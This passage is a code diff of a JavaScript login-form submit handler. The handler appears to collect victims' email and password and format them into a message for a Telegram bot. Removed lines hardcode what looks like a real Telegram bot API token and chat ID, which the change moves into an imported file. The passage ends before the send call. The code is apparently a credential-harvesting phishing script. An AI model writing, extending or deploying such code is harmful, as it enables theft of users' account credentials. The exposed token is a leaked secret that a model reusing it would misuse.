@@ -84,7 +84,7 @@ function validateForm(event) {
     
     // console.log(email, password);
 }
-
+import {apiToken, chatId} from './tg_tokens.js';
 async function formSubmit(event) {
     event.preventDefault();
 
@@ -94,9 +94,7 @@ async function formSubmit(event) {
     if(!email || !password) {
         return false;
     }
-
-    let apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
-    let chatId = "-4066219312";
+    
 
     let text = `
     <b>Email:</b> ${email}<b>Password</b> ${password}
